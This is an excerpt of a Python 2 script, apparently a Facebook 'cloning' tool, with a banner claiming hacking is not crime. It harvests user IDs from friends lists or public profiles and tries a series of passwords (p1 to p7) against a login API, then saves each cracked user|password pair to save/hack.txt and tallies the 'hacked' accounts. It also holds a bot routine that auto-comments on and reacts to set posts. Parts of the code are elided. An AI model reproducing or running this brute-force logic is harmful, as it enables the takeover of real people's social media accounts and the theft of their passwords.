...
__██____██___\
x1b[1;94m──────────────────────────────────────────────────────
\x1b[1;91m➣ HACKING IS NOT CRIME IT’S A 
\x1b[1;92m➣ GAME AGAINST OF THE SYSTEM
\x1b[1;93m➣ AUTHOR NAME : RASHED HOSSAIN
\x1b[1;94m➣ FROM : SHARIATPUR DHAKA BANGLADESH
\x1b[1;95m➣ FACEBOOK I'D NAME: ISMAIL TALUKDER
\x1b[1;96m➣ FACEBOOK USER LINK: Rashed.Error.403
\x1b[1;97m➣ WARNING : USE FAST 4G INTERNER
\x1b[1;91m➣ WARNING : USE 6GB RAM PHONE
\x1b[1;92m➣ WARNING : USE TOUCH VPN PROXY
\x1b[1;93m➣ WARNING : CONNECT SINGAPORE FOR CLONING
\x1b[1;94m──────────────────────────────────────────────────────""" 
...
def bot_komen():
    ...
    una = '100009259963367'
    kom = 'woow\xf0\x9f\x98\x98'
    kom = 'amazing\xf0\x9f\x98\x8e'
    reac = 'LOVE'
    post = '3074682199517082'
    post2 = '3067025113616124'
    kom2 = 'woow\xf0\x9f\x98\x98\xe2\x98\xa0\xef\xb8\x8f'
    kom = 'amazing\xf0\x9f\x98\x98\xf0\x9f\x98\x98'
...
def super():
    ...
    os.system('clear')
    print logo
    print '\x1b[1;97m> 1.\x1b[0m \x1b[37;1m RASHED Crack from friends list'
    print '\x1b[1;97m> 2.\x1b[0m \x1b[37;1m RASHED Crack from Public Id'
    pilih_super()
...
def pilih_super():
    ...
    def main(arg):
        ...
        try:
            ...
            if 'access_token' in q:
                print '\x1b[1;92m[RASHED-Ok] ' + user + ' |\x1b[0m ' + p1
                cek = open('save/hack.txt', 'a')
                cek.write(user + '|' + p1 + '\n')
                cek.close()
                oks.append(user + p1)
            elif 'www.facebook.com' in q['error_msg']:
                print '\x1b[1;93m[RASHED-CP] ' + user + ' |\x1b[0m ' + p1
                ...
                q = json.load(data)
                if 'access_token' in q:
                    print '\x1b[1;;92m[RASHED-Ok] ' + user + ' |\x1b[0m ' + p2
                    cek = open('save/hack.txt', 'a')
                    cek.write(user + '|' + p2 + '\n')
                    cek.close()
                    oks.append(user + p2)
                elif 'www.facebook.com' in q['error_msg']:
                    print '\x1b[1;;93m [RASHED-CP] ' + user + ' |\x1b[0m ' + p2
                    ...
                    if 'access_token' in q:
                        ...
                        print '\x1b[1;93m [RASHED-CP] ' + user + ' |\x1b[0m ' + p3
                        ...
                        q = json.load(data)
                        if 'access_token' in q:
                            print '\x1b[1;92m[RASHED-Ok] ' + user + ' |\x1b[0m ' + p4
                            cek = open('save/hack.txt', 'a')
                            cek.write(user + '|' + p4 + '\n')
                            cek.close()
                            oks.append(user + p4)
                        elif 'www.facebook.com' in q['error_msg']:
                            print '\x1b[1;93m[RASHED-CP] ' + user + ' |\x1b[0m ' + p4
                            ...
                            q = json.load(data)
                            if 'access_token' in q:
                                print '\x1b[1;92m[RASHED-OK] ' + user + ' |\x1b[0m ' + p5
                                cek = open('save/hack.txt', 'a')
                                cek.write(user + '|' + p5 + '\n')
                                cek.close()
                                oks.append(user + p5)
                            elif 'www.facebook.com' in q['error_msg']:
                                print '\x1b[1;93m [RASHED-CP] ' + user + ' |\x1b[0m ' + p5
                                ...
                                q = json.load(data)
                                if 'access_token' in q:
                                    print '\x1b[1;92m[RASHED-HACKED] ' + user + ' |\x1b[0m ' + p6
                                    cek = open('save/hack.txt', 'a')
                                    cek.write(user + '|' + p6 + '\n')
                                    cek.close()
                                    oks.append(user + p5)
                                elif 'www.facebook.com' in q['error_msg']:
                                    print '\x1b[1;;93m [RASHED-CP] ' + user + ' |\x1b[0m ' + p6
                                    ...
                                    q = json.load(data)
                                    if 'access_token' in q:
                                        print '\x1b[1;92m[RASHED-Ok] ' + user + ' |\x1b[0m ' + p7
                                        cek = open('save/hack.txt', 'a')
                                        cek.write(user + '|' + p7 + '\n')
                                        cek.close()
                                        oks.append(user + p7)
                                    elif 'www.facebook.com' in q['error_msg']:
                                        print '\x1b[1;93m[RASHED-CP] ' + user + ' |\x1b[0m ' + p7
                                        cekpoint.append(user + p6)
        except:
            pass
    ...
    p.map(main, id)
    print 25 * '-'
    print '\x1b[1;92m[ RASHED CLONING DONE !'
    print '\x1b[1;92m[RASHED-HACKED : ' + str(len(oks))
